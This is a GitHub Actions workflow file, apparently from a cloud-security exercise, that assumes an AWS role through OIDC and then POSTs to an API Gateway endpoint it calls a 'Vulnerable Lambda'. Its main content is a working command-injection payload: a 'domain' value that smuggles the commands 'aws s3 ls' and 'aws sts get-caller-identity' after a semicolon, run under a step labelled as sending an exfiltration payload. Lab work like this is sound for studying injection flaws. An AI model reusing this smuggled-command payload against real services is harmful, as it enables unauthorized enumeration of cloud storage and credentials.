name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda
        run: |
          API_ID="3q931syi7b"
          REGION="us-east-1"
          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
          
          # This payload runs nslookup, then uses the Lambda's built-in AWS CLI 
          # to list all S3 buckets in the account and check whoami for the Lambda role!
          PAYLOAD='{"domain": "127.0.0.1; aws s3 ls; aws sts get-caller-identity"}'
          
          echo "=== SENDING EXFILTRATION PAYLOAD ==="
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "$PAYLOAD"
